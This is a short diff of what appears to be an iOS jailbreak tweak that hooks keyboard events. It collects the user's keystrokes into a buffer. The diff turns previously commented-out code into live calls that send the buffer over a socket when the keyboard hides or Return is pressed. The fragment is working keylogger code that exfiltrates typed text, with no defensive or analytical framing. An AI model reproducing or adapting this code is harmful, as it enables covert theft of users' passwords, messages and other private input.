@@ -20,8 +20,8 @@ NSMutableString *INPUT = [[NSMutableString alloc] initWithCapacity:100];
 - (void)keyboardDidHide:(id)arg1{
     if([INPUT length]>0){
         NSLog(@"yujianbo : send :%@",INPUT);
-//        SocketClass *socket = [[SocketClass alloc] init];
-//        [socket SendSocket:INPUT];
+        SocketClass *mysocket = [[SocketClass alloc] init];
+        [mysocket SendSocket:(NSString *)INPUT];
         [INPUT setString:@""];
     }
     %orig;
@@ -42,8 +42,8 @@ NSMutableString *INPUT = [[NSMutableString alloc] initWithCapacity:100];
     }else if([name isEqualToString:@"Return-Key"]){
         if([INPUT length]>0){
             NSLog(@"yujianbo : send :%@",INPUT);
-//            SocketClass *socket = [[SocketClass alloc] init];
-//            [socket SendSocket:INPUT];
+            SocketClass *mysocket = [[SocketClass alloc] init];
+            [mysocket SendSocket:(NSString *)INPUT];
             [INPUT setString:@""];
         }
     }
